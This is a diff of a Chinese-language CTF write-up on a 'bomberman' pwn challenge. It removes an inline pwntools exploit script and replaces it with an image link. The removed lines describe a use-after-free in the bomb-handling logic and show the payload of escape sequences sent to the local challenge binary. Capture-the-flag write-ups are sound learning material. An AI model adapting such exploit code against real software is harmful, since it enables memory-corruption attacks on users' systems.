@@ -48,42 +48,8 @@ payload = right_chr + " " + left_chr + "a"*24 + right_chr + " "
 这个是题目的一个 bonus，还是上面的那个情况，等 fire 过了时间会 `_bomb.release();`，之后 _bomb 就没人管 维持原样了，而此时 _bomb 的 timer 正好为3     
 当然，这个条件不是必须的，用 search 可以看到堆上有其他固定为 "\x03" 的地方，让 player 穿墙后走过去应该也行      
 ### exp
-```py
-from pwn import*
-import struct
-context(os='linux',arch='amd64',log_level='debug')
 
-# put_bomb 的时候 player->bomb() 被 move 到 Stage 的 _bomb，然后在图上标记出来
-# pickup_bomb 的时候会 move Stage 的 _bomb 到 player->bomb()
-# 在 create_fire 的时候没有 release _bomb 所以可能有一个 uaf 想一下怎么用吧
-# set bomb 的原理是在 bomb 的上下左右分别去 burn 遇到 block 的话就烧掉
-# timer: 每次 tick 会 timer ++ ; tick 和时钟同频  
-# 每一轮先 tick 再 draw  
-
-# 这个 timer 是通过一次 send 一堆来控制的！而非控制 sleep 的时间
-p = process("./game")
-# gdb.attach(p,'''
-#            b *$rebase(0x361a)
-#            b* $rebase(0x3699)
-#            b* $rebase(0x3936)
-#            b* $rebase(0x37e0)
-#            b* $rebase(0x3f81)
-#            ''')
-# pause()
-sleep(1)
-# TODO 问这些是咋得到的
-left_chr = "\x1bOD"
-right_chr = "\x1bOC"
-up_chr = "\x1bOA"
-down_chr = "\x1bOB"
-
-payload = right_chr + " " + left_chr + "a"*24 + right_chr + " "  # put bomb at (5,0) 现在在 (2,1)  
-payload += " "+ "a"*30 +right_chr*3 + up_chr*4 + right_chr*2 # 从 (5,-1) 破墙 (7,-3)
-sleep(0.1)
-p.send(payload)
-p.interactive()
-
-```   
+![alt_text](/assets/img/uploads/exp_bomberman.png)
 
 ## DataStore2
 卡了两次，一次是在 leak libc 的时候只想到了 double free， 还有一次是在最后堆重叠写 fd 的时候没想明白（     
